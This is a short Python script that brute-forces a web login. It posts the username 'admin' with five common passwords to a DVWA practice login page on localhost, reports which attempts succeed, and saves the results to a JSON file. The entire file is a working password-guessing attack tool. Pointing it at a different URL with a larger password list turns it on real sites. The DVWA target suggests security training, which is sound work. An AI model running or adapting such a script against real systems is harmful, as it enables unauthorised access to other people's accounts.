import requests
import json

# Target login URL
url = "http://localhost/dvwa/login.php"

# Username and password list
username = "admin"
passwords = ["admin", "password", "123456", "1234", "test"]

# List to store results
results = []

for password in passwords:
    
    data = {
        "username": username,
        "password": password,
        "Login": "Login"
    }

    response = requests.post(url, data=data)

    # Check if login was successful
    if "Login failed" not in response.text:
        status = "Possible login found"
        print(f"[+] Possible Login Found: {username}:{password}")
    else:
        status = "Login failed"
        print(f"[-] Failed Login: {username}:{password}")

    # Store result
    results.append({
        "username": username,
        "password": password,
        "status": status
    })

# Save results to JSON file
with open("bruteforce_results.json", "w") as file:
    json.dump(results, file, indent=4)

print("\nScan completed. Results saved in bruteforce_results.json")